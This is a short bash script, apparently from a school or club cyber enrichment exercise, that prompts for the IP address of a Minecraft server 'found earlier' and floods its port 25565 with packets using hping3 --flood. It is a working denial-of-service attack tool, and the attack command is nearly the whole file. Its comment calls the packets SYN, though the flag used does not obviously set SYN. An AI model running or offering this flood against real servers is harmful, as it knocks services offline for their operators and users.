#!/bin/bash
#DosScript
echo "UTC Cyber enrichment DoS Script - Developed by Keelan Baines"
echo -e "Enter the IPv4 address of the MC server you found earlier: " #waits for user input
read ip #stores IP entered under variable $ip
echo "Server IP: $ip" #prints IP entered by user

sudo hping3 -C 10000 -d 120 -s -w 64 -p 25565 --flood $ip #Floods the host with SYN packets
